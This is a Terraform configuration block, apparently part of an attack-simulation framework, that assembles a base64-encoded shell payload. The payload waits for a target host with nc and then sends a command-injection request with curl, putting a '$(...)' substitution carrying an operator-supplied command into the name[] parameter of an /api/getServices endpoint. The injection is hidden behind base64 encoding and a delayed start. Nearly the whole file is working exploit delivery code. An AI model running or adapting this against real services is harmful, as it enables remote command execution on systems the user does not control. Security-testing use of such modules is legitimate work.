locals {
    attack_dir = "/npm_attack"
    attack_script = "npm_attack.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_npm_attack.lock"
    target_ip=var.inputs["target_ip"]
    target_port=var.inputs["target_port"]
    payload = <<-EOT
    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${local.delayed_start} | base64 -d > ${local.start_script}
    echo ${local.npm_attack} | base64 -d > ${local.attack_script}

    log "starting script..."
    /bin/bash ${local.start_script}

    log "done."
    
    EOT

    delayed_start   = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    scriptname = "delayed_start_npm_attack"
                                    lock_file = local.lock_file
                                    attack_delay = var.inputs["attack_delay"]
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))

    npm_attack           = base64encode(templatefile(
                            "${path.module}/resources/${local.attack_script}",
                            {
                                content =   <<-EOT
                                            log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.inputs["payload"]})'"
                                            log "checking target: ${local.target_ip}:${local.target_port}"
                                            while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
                                                log "failed check - waiting for target";
                                                sleep 30;
                                            done;
                                            log "target available - sending payload";
                                            sleep 5;
                                            curl --get --verbose "http://${local.target_ip}:${local.target_port}/api/getServices" --data-urlencode 'name[]=$(${var.inputs["payload"]})' >> $LOGFILE 2>&1;
                                            echo "\n" >> $LOGFILE
                                            log "payload sent sleeping..."
                                            log "done";
                                            EOT
                            }
                    ))

    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = basename(path.module)
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}